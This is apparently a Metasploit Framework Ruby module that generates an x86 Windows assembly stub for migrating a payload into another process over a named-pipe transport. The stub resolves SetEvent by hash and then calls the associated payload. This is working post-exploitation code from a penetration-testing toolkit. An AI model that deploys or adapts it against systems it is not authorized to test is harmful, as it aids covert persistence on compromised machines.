# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/migrate_common'

module Msf

###
#
# Payload that supports migrating over Named Pipe transports on x86.
#
###

module Payload::Windows::MigrateNamedPipe

  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Migrate over Named Pipe transport',
      'Description' => 'Migration stub to use over Named Pipe transports',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
    ))
  end

  #
  # Constructs the payload
  #
  def generate
    %Q^
    migrate:
      cld
      pop esi
      pop esi                   ; esi now contains a pointer to the migrate context
      sub esp, 0x2000
      call start
      #{asm_block_api}
    start:
      pop ebp
      mov edi, [esi+16]         ; The duplicated pipe handle is in the migrate context.
    signal_event:
      push dword [esi]          ; Event handle is pointed at by esi
      push #{Rex::Text.block_api_hash('kernel32.dll', 'SetEvent')}
      call ebp                  ; SetEvent(handle)
    call_payload:
      call dword [esi+8]        ; call the associated payload
    ^
  end

end

end
